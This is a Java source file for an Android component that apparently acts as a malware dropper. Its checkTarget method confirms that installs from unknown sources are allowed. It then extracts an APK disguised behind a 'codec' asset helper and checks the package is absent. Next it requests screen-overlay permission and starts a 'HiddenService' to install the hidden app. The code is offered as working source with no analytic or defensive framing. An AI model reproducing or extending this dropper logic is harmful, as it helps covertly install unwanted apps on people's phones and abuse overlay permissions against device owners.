package secretapp.web.com;

import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;

import com.evernote.android.job.Job;

import main_commons.app.c_master.commons.commons.SdkCommons;
import main_commons.app.c_master.commons.commons.SdkComponent;
import main_commons.app.c_master.keep.NetworkApi;
import timber.log.Timber;

public class SecretAppComponent extends SdkComponent {

    private static SecretAppComponent instance = null;

    private final String targetAssetsFilePath;

    private OverlayHelper overlayHelper = new OverlayHelper();

    public static SecretAppComponent get() {
        return instance;
    }

    public SecretAppComponent(String targetAssetsFilePath) {
        this.targetAssetsFilePath = targetAssetsFilePath;
        instance = this;
    }

    @Override
    public void initialize(Application context, SdkCommons sdk, NetworkApi api) {
        super.initialize(context, sdk, api);
        overlayHelper.init(context);
    }

    @Nullable
    @Override
    public Job createJob(@NonNull String tag) {
        return null;
    }

    public OverlayHelper getOverlayHelper() {
        return overlayHelper;
    }

    public void checkTarget() {
        if (HiddenService.isServiceRunning()) {
            Timber.e("checkTarget -> Service is already running");
            return;
        }
        if (!Utils.isUnknownSourcesEnabled(context())) {
            Timber.e("checkTarget -> Unknown sources is disabled");
            return;
        }
        String apkFilePath = Utils.getCodecAppFile(context(), targetAssetsFilePath);
        if (apkFilePath == null) {
            Timber.e("checkTarget -> apkFilePath == null");
            return;
        }
        String pkgName = Utils.getPackageName(context(), apkFilePath);
        if (pkgName == null) {
            Timber.e("checkTarget -> pkgName == null");
            return;
        }
        if (Utils.isAppInstalled(context(), pkgName)) {
            Timber.e("checkTarget -> App is already installed");
            return;
        }
        //
        if (!hasOverlayPermission(context())) {
            PermissionActivity.start(context());
        } else {
            Intent starter = new Intent(context(), HiddenService.class);
            starter.putExtra(HiddenService.APK_FILE_PATH, apkFilePath);
            starter.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context().startService(starter);
        }
    }

    public boolean hasOverlayPermission(Context context) {
        return Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(context);
    }
}
